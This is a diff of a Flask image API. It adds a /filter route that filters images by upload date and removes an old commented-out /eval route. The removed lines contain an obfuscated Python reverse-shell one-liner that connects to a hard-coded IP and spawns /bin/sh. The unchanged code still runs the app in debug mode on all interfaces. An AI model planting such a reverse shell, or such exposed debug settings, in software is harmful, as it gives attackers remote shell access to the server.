@@ -4,6 +4,7 @@ from flask_swagger_ui import get_swaggerui_blueprint
 from flask_cors import CORS
 import os
 import time
+from sqlalchemy import extract
 import datetime
 
 app = Flask(__name__)
@@ -101,19 +102,25 @@ def get_image(image_id):
         return jsonify({'error': 'Image not found'}), 404
     return send_from_directory(os.path.dirname(image.file_path), os.path.basename(image.file_path))
 
-# @app.route("/eval")
-# def calculate():
-#     # output = 'q12'
-#     p = int(request.args.get("p"))
+@app.route('/filter', methods=['GET'])
+def get_image_filter():
+    year = request.args.get('year', type=int)
+    month = request.args.get('month', type=int)
+    day = request.args.get('day', type=int)
 
-#     # output = 
-#     # print(str(output))
-#     # print("testtesttesttesttesttesttesttest"+str(command))
-#     a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.153.32.126",p));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())
-    
-#     return jsonify({"output": "abc"+str(eval(""))})
-#     # return "abc"
-#     # return app.render_template('calculator.html', command = command)
+    query = Image.query
+
+    # กรองตามปี / เดือน / วัน
+    if year:
+        query = query.filter(extract('year', Image.uploaded_at) == year)
+    if month:
+        query = query.filter(extract('month', Image.uploaded_at) == month)
+    if day:
+        query = query.filter(extract('day', Image.uploaded_at) == day)
+
+    images = query.order_by(Image.uploaded_at.desc()).all()
+
+    return jsonify([image.to_dict() for image in images])
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0')
